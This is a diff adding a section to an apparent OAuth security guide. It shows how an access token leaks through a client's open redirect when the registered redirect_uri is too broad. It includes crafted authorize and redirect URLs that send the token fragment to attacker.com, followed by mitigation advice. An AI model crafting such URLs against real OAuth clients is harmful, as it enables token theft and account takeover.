@@ -183,5 +183,27 @@ If an HTTP request `/bar#foo` has a 302 response with Location `/qux`, is the `#
 
 What the majority of browsers do at the moment is to preserve the original fragment on redirect: that is, the new request is on the form `/qux#foo`. Also remember that fragments are never sent to the server, as they’re intended to be used inside the browser itself.
 
-The attack here is similar to the previous one and all the premises we have established there remain: “too open” registered redirect_uri and authorization server that uses an allowing subdirectory validation strategy. As the leakage here happens through an open redirect rather than using the referrer, you also need to assume that the OAuth client’s domain has an open redirect, for example: `https://yourouauthclient.com/redirector?goto=http://targetwebsite.com`. As previously mentioned, there are fair chances that this kind of entry point exists on a website (even in the OAuth context13).
+The attack here is similar to the previous one and all the premises we have established there remain: “too open” registered redirect_uri and authorization server that uses an allowing subdirectory validation strategy. As the leakage here happens through an open redirect rather than using the referrer, you also need to assume that the OAuth client’s domain has an open redirect, for example: `https://yourouauthclient.com/redirector?goto=http://targetwebsite.com`. As previously mentioned, there are fair chances that this kind of entry point exists on a website (even in the OAuth context).
 
+The attacker can craft a URI like this:
+
+```
+https://oauthprovider.com/authorize?response_type=token&client_id=CLIENTID&scope=SCOPES&state=STATE&redirect_uri=https://yourouauthclient.com/
+redirector?goto=https://attacker.com
+```
+
+If the resource owner has already authorized the application using TOFU, or if they can be convinced to authorize the application again, the resource owner’s user agent is redirected to the passed-in redirect_uri with the access_token appended in the URI fragment:
+
+```
+https://yourouauthclient.com/redirector?goto=https://attacker.com#accesstoken=2YotnFZFEjr1zCsicMWpAA
+```
+
+At this point, the open redirect in the client application forwards the user agent to the attacker’s website. Since URI fragments survive redirects in most browsers, the final landing page will be:
+
+```
+https://attacker.com#access_token=2YotnFZFEjr1zCsicMWpAA
+```
+
+Now it’s trivial for the attacker to steal the access token.
+
+Both the attacks discussed above can be mitigated by the same simple practice. By registering the most specific redirect_uri possible, that would correspond to `https://yourouauthclient.com/oauth/oauthprovider/callback` in our example, the client can avoid having the attacker take over control of its OAuth domain. Obviously, you need to design your client application to avoid letting an attacker create a page under `https://yourouauthclient.com/oauth/oauthprovider/callback` as well; otherwise, you’re back to square one. However, the more specific and direct the registration is, the less likely it is for there to be a matching URI under the control of a malicious party.
